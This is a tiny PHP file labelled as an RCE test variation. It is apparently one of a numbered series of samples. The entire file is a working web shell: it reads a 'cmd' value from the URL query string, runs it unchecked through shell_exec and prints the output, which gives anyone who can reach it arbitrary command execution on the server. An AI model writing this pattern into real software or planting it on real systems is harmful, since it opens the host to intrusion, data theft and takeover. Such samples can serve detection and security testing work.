<?php
// RCE test variation #352
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>